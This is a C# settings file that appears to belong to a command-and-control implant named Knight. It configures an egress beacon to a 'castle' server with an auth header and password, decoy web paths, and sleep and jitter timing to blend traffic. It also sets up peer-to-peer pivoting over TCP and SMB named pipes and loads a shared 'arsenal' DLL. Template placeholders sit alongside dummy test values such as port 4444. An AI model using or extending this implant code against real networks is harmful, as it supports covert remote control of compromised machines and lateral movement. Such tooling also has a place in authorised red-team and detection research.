//-------------------- Test
//#define DUMMY
//#define Egress
//#define P2P_TCP_SERVER
//#define P2P_TCP_CLIENT
//#define P2P_SMB_SERVER
//#define P2P_SMB_CLIENT
//--------------------

using System;


namespace Knight
{
    static public class Settings
    {
#if !DUMMY
        //-------------------- Egress
#if Egress
        public static readonly string castle = "{{R_CastleIp}}";
        public static readonly int port = {{R_Port}};
        public static readonly bool tls = {{R_Tls}};

        static readonly public string HeaderForPassd = "{{R_HeaderForPasswd}}";
        static readonly public string Passwd = "{{R_Passwd}}";

        static private string[] GetPaths = {{R_GetPaths}};
        static private string[] PostPaths = {{R_PostPaths}};

        static private int sleep = {{R_Sleep}};
        static private int jitter = {{R_Jitter}};
        static private int upper = 0;
        static private int lower = 0;

        //-------------------- P2P TCP SERVER
#elif P2P_TCP_SERVER
        public static readonly bool loopback = {{R_Loopback}};
        public static readonly int? port = {{R_Port}};
        
        //-------------------- P2P TCP CLIENT
#elif P2P_TCP_CLIENT
        public static readonly string remoteAddress = "{{R_RemoteAddress}}";
        public static readonly int? port = {{R_Port}};
        
        //-------------------- P2P  SMB SERVER
#elif P2P_SMB_SERVER
        public static readonly string pipename = "{{R_Pipename}}";

        //-------------------- P2P  SMB CLIENT
#elif P2P_SMB_CLIENT
        public static readonly string pipename = "{{R_Pipename}}";
        public static readonly string hostname = "{{R_Hostname}}";

#endif
        //-------------------- Global

        public static readonly string SharedArsenal = "{{R_SharedArsenal}}";

#else
        //-------------------- DUMMY for testing
        //-------------------- Egress
#if Egress
        public static readonly string castle = "127.0.0.1";
        public static readonly int port = 8080;
        public static readonly bool tls = false;

        static readonly public string HeaderForPassd = "X-IronHelm";
        static readonly public string Passwd = "HelmOfIron";

        static private string[] GetPaths = { "/index.php", "/home.php" };
        static private string[] PostPaths = { "/submit.php", "/general.php" };

        //-------------------- P2P TCP SERVER
#elif P2P_TCP_SERVER
        public static readonly bool loopback = false;
        public static readonly int? port = 4444;
        
        //-------------------- P2P TCP CLIENT
#elif P2P_TCP_CLIENT
        public static readonly string remoteAddress = "127.0.0.1";
        public static readonly int? port = 4040;
        
        //-------------------- P2P  SMB SERVER
#elif P2P_SMB_SERVER
        public static readonly string pipename = "ironhelm";

        //-------------------- P2P  SMB CLIENT
#elif P2P_SMB_CLIENT
        public static readonly string pipename = "helm";
        public static readonly string hostname = "WinDev";

#endif
        //-------------------- Global

        public static readonly string SharedArsenal = "SharedArsenal.dll";
        static private int sleep = 2; // 1 - 3
        static private int jitter = 1;
        static private int upper = 0;
        static private int lower = 0;
#endif


        //-------------------- Functions
#if Egress

        static Settings()
        {
            SetSleepJitter(sleep.ToString(), jitter.ToString());
        }

        static public string RandomGetPath()
        {
            var rand = new Random();
            return GetPaths[rand.Next(0, GetPaths.Length)];
        }

        static public string RandomPostPath()
        {
            var rand = new Random();
            return PostPaths[rand.Next(0, PostPaths.Length)];
        }
        static public string SetSleepJitter(string inter, string jitt)
        {
            Console.WriteLine("HERE");
            int i = Int32.Parse(inter);
            int j = Int32.Parse(jitt);

            if (i < 0 || j < 0)
            {
                return "Failed to set";
            }
            else if (j > i)
            {
                return "Failed to set"; ;
            }

            sleep = i;
            jitter = j;
            upper = i + j;
            lower = i - j;

            return "New settings: " + GetSleepJitter();
        }

        static public string GetSleepJitter()
        {
            return sleep.ToString() + " " + jitter.ToString();
        }

        static public TimeSpan GetSleepTime()
        {
            Random rand = new Random();
            int ran = rand.Next(lower, upper + 1);
            //Console.WriteLine($"upper: {upper} lower: {lower} random: {ran}"); // DEBUG

            return new TimeSpan(0, 0, ran);
        }
#endif

    }
}